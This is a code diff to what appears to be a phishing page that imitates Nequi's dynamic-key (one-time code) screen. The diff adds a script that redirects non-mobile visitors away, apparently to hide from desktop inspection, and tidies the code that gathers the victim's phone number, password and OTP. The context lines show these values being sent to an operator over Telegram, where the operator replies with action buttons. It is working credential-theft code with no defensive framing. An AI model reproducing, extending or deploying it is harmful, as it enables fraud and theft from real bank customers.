@@ -22,6 +22,15 @@
   </style>
 </head>
 
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    let esMovil = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+    if (!esMovil) {
+      window.location.href = "../pc.html";
+    }
+  });
+</script>
+
 <body class="bg-purple-primary h-dvh flex flex-col">
   <main class="loadingContainer">
     <section class="mainSectionContainer loading">
@@ -52,7 +61,7 @@
   </header>
 
   <section class="flex-1 max-w-[420px] flex flex-col mx-auto w-full px-4">
-    <div class="max-w-[350px] w-full flex justify-center gap-4 mx-auto mb-6">
+    <div class="max-w-[380px] w-full flex justify-center gap-3 mx-auto mb-6">
       <input id="din-1" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
       <input id="din-2" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
       <input id="din-3" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
@@ -85,7 +94,7 @@
         <button class="invisible" disabled></button>
         <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="0">0</button>
         <button class="keyboard-btn text-white w-12 h-12 border-none bg-transparent cursor-pointer rounded-full transition-colors duration-200" id="delete-din">
-          <svg width="33" height="30" viewBox="0 0 29 27" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <svg width="33" height="30" viewBox="0 0 29 27" fill="none">
             <path fill-rule="evenodd" clip-rule="evenodd" d="M26.8068 0C27.9114 0 28.8068 0.895431 28.8068 2V24.727C28.8068 25.8316 27.9114 26.727 26.8068 26.727H15.4722C14.9712 26.727 14.4884 26.5389 14.1194 26.2001L4.15169 17.0462C1.99435 15.065 1.99435 11.662 4.15169 9.68082L14.1194 0.526929C14.4884 0.188043 14.9712 0 15.4722 0H26.8068Z" fill="currentColor"></path>
             <path d="M16.3541 11.1945L21.3873 16.2277" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
             <path d="M21.2213 11.4275L16.3423 16.3065" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
@@ -107,21 +116,25 @@
       const errorMessage = document.querySelector(".errorMessage");
       let currentInput = 0;
 
-      // Manejar clics del teclado
+      if (!formData.phoneNumber || !formData.password) {
+        console.error("❌ Datos incompletos");
+        window.location.href = "accces-sign-in.html";
+        return;
+      }
+
       keyboard.addEventListener("click", (e) => {
         const button = e.target.closest(".keyboard-btn");
         if (button && !button.id.includes("delete")) {
           const value = button.dataset.value;
           if (currentInput < inputs.length) {
             inputs[currentInput].dataset.realValue = value;
-            inputs[currentInput].value = value; // Mostrar el número real
+            inputs[currentInput].value = value;
             inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
             currentInput++;
           }
         }
       });
 
-      // Manejar el botón de borrar
       deleteBtn.addEventListener("click", () => {
         if (currentInput > 0) {
           currentInput--;
@@ -131,7 +144,6 @@
         }
       });
 
-      // Permitir borrar con tecla retroceso
       document.addEventListener("keydown", (e) => {
         if (e.key === "Backspace" && currentInput > 0) {
           currentInput--;
@@ -141,7 +153,6 @@
         }
       });
 
-      // Prevenir entrada de teclado físico
       inputs.forEach((input) => {
         ["keydown", "keyup", "keypress"].forEach((eventType) => {
           input.addEventListener(eventType, (e) => {
@@ -155,11 +166,8 @@
           e.preventDefault();
           return false;
         });
-        input.setAttribute("readonly", "readonly");
-        input.setAttribute("inputmode", "none");
       });
 
-      // Verificar cuando se complete la clave dinámica
       inputs.forEach((input) => {
         input.addEventListener("input", async () => {
           let isComplete = Array.from(inputs).every((inp) => inp.value !== "");
@@ -176,9 +184,8 @@
             savedData.dinamica = dinamica;
             localStorage.setItem("formData", JSON.stringify(savedData));
             
-            loadingSpinner.style.display = "block";
+            if (loadingSpinner) loadingSpinner.style.display = "block";
 
-            // Enviar clave dinámica a Telegram
             const mensaje = `🔐 *CLAVE DINÁMICA NEQUI*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${savedData.password}\n🎯 *Dinámica:* ${dinamica}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
             
             const teclado = JSON.stringify({
@@ -201,19 +208,19 @@
               const { action } = await waitForButtonPress(responseMensaje.message_id);
               await handleAction(action, transactionId);
             } catch (error) {
-              console.error("Error al enviar la clave dinámica:", error);
-              loadingSpinner.style.display = "none";
-              errorMessage.style.display = "block";
-              errorMessage.textContent = "⚠️ Error de conexión. Intenta nuevamente.";
-              
-              // Limpiar campos después de 3 segundos
+              console.error("❌ Error:", error);
+              if (loadingSpinner) loadingSpinner.style.display = "none";
+              if (errorMessage) {
+                errorMessage.style.display = "block";
+                errorMessage.textContent = "⚠️ Error de conexión. Intenta nuevamente.";
+              }
               setTimeout(() => {
                 inputs.forEach(inp => {
                   inp.value = "";
                   inp.dataset.realValue = "";
                 });
                 currentInput = 0;
-                errorMessage.style.display = "none";
+                if (errorMessage) errorMessage.style.display = "none";
               }, 3000);
             }
           }
